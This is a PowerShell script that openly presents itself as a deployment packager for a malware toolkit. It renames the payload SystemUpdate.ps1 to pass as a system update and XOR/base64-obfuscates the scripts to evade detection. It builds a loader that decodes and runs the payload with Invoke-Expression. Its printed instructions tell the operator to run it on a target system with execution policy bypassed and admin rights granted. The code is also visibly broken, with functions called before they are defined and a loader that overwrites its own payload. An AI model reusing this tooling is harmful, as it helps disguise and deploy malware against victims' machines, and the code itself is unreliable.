#Requires -Version 5.1
<#
.SYNOPSIS
    PowerShell Malware Toolkit Deployment Script
.DESCRIPTION
    Packages and obfuscates the PowerShell malware toolkit for deployment
#>

[CmdletBinding()]
param(
    [string]$OutputPath = ".\Deployed",
    [switch]$Obfuscate,
    [switch]$CreateExecutable
)

# Create output directory
if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
}

# Copy main script
$MainScript = ".\Main.ps1"
$DeployedMain = Join-Path $OutputPath "SystemUpdate.ps1"

if (Test-Path $MainScript) {
    Copy-Item -Path $MainScript -Destination $DeployedMain -Force
    Write-Host "✓ Main script deployed: $DeployedMain" -ForegroundColor Green
}

# Copy modules
$ModulesDir = ".\Modules"
$DeployedModulesDir = Join-Path $OutputPath "Modules"

if (Test-Path $ModulesDir) {
    if (-not (Test-Path $DeployedModulesDir)) {
        New-Item -ItemType Directory -Path $DeployedModulesDir -Force | Out-Null
    }
    
    Get-ChildItem -Path $ModulesDir -Filter "*.ps1" | ForEach-Object {
        $DeployedModule = Join-Path $DeployedModulesDir $_.Name
        Copy-Item -Path $_.FullName -Destination $DeployedModule -Force
        Write-Host "✓ Module deployed: $($_.Name)" -ForegroundColor Green
    }
}

# Obfuscate if requested
if ($Obfuscate) {
    Write-Host "Obfuscating scripts..." -ForegroundColor Yellow
    
    # Obfuscate main script
    $MainContent = Get-Content -Path $DeployedMain -Raw
    $ObfuscatedContent = ConvertTo-ObfuscatedString -InputString $MainContent
    Set-Content -Path $DeployedMain -Value $ObfuscatedContent -Force
    
    # Obfuscate modules
    Get-ChildItem -Path $DeployedModulesDir -Filter "*.ps1" | ForEach-Object {
        $ModuleContent = Get-Content -Path $_.FullName -Raw
        $ObfuscatedModuleContent = ConvertTo-ObfuscatedString -InputString $ModuleContent
        Set-Content -Path $_.FullName -Value $ObfuscatedModuleContent -Force
    }
    
    Write-Host "✓ Scripts obfuscated" -ForegroundColor Green
}

# Create executable if requested
if ($CreateExecutable) {
    Write-Host "Creating executable..." -ForegroundColor Yellow
    
    # Create PS2EXE wrapper
    $PS2EXEScript = @"
#Requires -Version 5.1
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Load obfuscated main script
`$ScriptPath = Split-Path -Parent `$MyInvocation.MyCommand.Path
`$MainScript = Join-Path `$ScriptPath "SystemUpdate.ps1"

if (Test-Path `$MainScript) {
    `$Content = Get-Content -Path `$MainScript -Raw
    `$DeobfuscatedContent = ConvertFrom-ObfuscatedString -ObfuscatedString `$Content
    Invoke-Expression `$DeobfuscatedContent
}
"@
    
    $PS2EXEPath = Join-Path $OutputPath "SystemUpdate.ps1"
    Set-Content -Path $PS2EXEPath -Value $PS2EXEScript -Force
    
    Write-Host "✓ Executable wrapper created: $PS2EXEPath" -ForegroundColor Green
}

# Create deployment package
$PackagePath = Join-Path $OutputPath "DeploymentPackage.zip"
if (Test-Path $PackagePath) {
    Remove-Item $PackagePath -Force
}

Compress-Archive -Path (Join-Path $OutputPath "*") -DestinationPath $PackagePath -Force

Write-Host "`n" -NoNewline
Write-Host "=" * 50 -ForegroundColor Cyan
Write-Host "DEPLOYMENT COMPLETE" -ForegroundColor Cyan
Write-Host "=" * 50 -ForegroundColor Cyan
Write-Host "Output Directory: $OutputPath" -ForegroundColor White
Write-Host "Package: $PackagePath" -ForegroundColor White
Write-Host "`nDeployment Contents:" -ForegroundColor Yellow
Get-ChildItem -Path $OutputPath -Recurse | ForEach-Object {
    Write-Host "  $($_.FullName.Replace($OutputPath, ''))" -ForegroundColor Gray
}

Write-Host "`nUsage Instructions:" -ForegroundColor Yellow
Write-Host "1. Extract the package to target system" -ForegroundColor White
Write-Host "2. Run: powershell.exe -ExecutionPolicy Bypass -File SystemUpdate.ps1" -ForegroundColor White
Write-Host "3. Grant administrative privileges when prompted" -ForegroundColor White
Write-Host "4. The system will initialize automatically" -ForegroundColor White

# Helper function for obfuscation
function ConvertTo-ObfuscatedString {
    param([string]$InputString)
    
    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    $Key = [System.Text.Encoding]::UTF8.GetBytes("DeploymentKey123")
    $Result = @()
    
    for ($i = 0; $i -lt $Bytes.Length; $i++) {
        $Result += $Bytes[$i] -bxor $Key[$i % $Key.Length]
    }
    
    return [System.Convert]::ToBase64String($Result)
}

function ConvertFrom-ObfuscatedString {
    param([string]$ObfuscatedString)
    
    $Bytes = [System.Convert]::FromBase64String($ObfuscatedString)
    $Key = [System.Text.Encoding]::UTF8.GetBytes("DeploymentKey123")
    $Result = @()
    
    for ($i = 0; $i -lt $Bytes.Length; $i++) {
        $Result += $Bytes[$i] -bxor $Key[$i % $Key.Length]
    }
    
    return [System.Text.Encoding]::UTF8.GetString($Result)
} 